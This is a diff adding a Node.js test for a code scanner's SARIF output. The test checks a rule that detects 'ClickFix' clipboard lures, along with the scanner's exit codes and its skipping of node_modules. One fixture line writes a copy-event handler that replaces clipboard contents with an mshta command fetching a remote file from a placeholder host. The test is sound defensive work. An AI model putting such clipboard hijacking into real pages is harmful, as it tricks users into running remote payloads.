@@ -1,0 +1,37 @@
+import test from 'node:test';
+import assert from 'node:assert/strict';
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { fileURLToPath } from 'node:url';
+const bin = fileURLToPath(new URL('../packages/unk-scanner/bin/unk-scanner.mjs', import.meta.url));
+
+test('directory scan emits SARIF 2.1.0 with rules, locations and fail-on exit codes', t => {
+  const dir = mkdtempSync(join(tmpdir(), 'unk-sarif-'));
+  t.after(() => rmSync(dir, { recursive: true, force: true }));
+  mkdirSync(join(dir, 'src'));
+  mkdirSync(join(dir, 'node_modules'));
+  writeFileSync(join(dir, 'src', 'lure.js'), "document.addEventListener('copy', e => e.clipboardData.setData('text', 'mshta https://example.invalid/x'));\n");
+  writeFileSync(join(dir, 'src', 'ok.mjs'), 'export const ok = 1;\n');
+  writeFileSync(join(dir, 'src', 'broken.cjs'), 'const = ;\n');
+  writeFileSync(join(dir, 'node_modules', 'skipped.js'), "navigator.clipboard.writeText('x');\n");
+  const run = args => spawnSync(process.execPath, [bin, ...args], { cwd: dir, encoding: 'utf8', timeout: 30000 });
+  const result = run(['--format', 'sarif', '--fail-on', 'error', '.']);
+  assert.equal(result.status, 1, result.stderr);
+  const sarif = JSON.parse(result.stdout);
+  assert.equal(sarif.version, '2.1.0');
+  const runData = sarif.runs[0];
+  assert.ok(runData.tool.driver.rules.some(r => r.id === 'clickfix-clipboard-command' && r.properties['security-severity'] === '8.0'));
+  const clickfix = runData.results.find(r => r.ruleId === 'clickfix-clipboard-command');
+  assert.equal(clickfix.level, 'error');
+  assert.equal(clickfix.locations[0].physicalLocation.artifactLocation.uri, 'src/lure.js');
+  assert.equal(clickfix.locations[0].physicalLocation.region.startLine, 1);
+  assert.equal(runData.invocations[0].executionSuccessful, false);
+  assert.match(runData.invocations[0].toolExecutionNotifications[0].locations[0].physicalLocation.artifactLocation.uri, /broken\.cjs/);
+  assert.ok(!runData.artifacts.some(a => a.location.uri.includes('node_modules')));
+  assert.equal(run(['--format', 'sarif', '.']).status, 0);
+  assert.equal(run(['--strict', '.']).status, 2);
+  const json = JSON.parse(run(['--include-node-modules', '.']).stdout);
+  assert.equal(json.files.length, 4);
+});
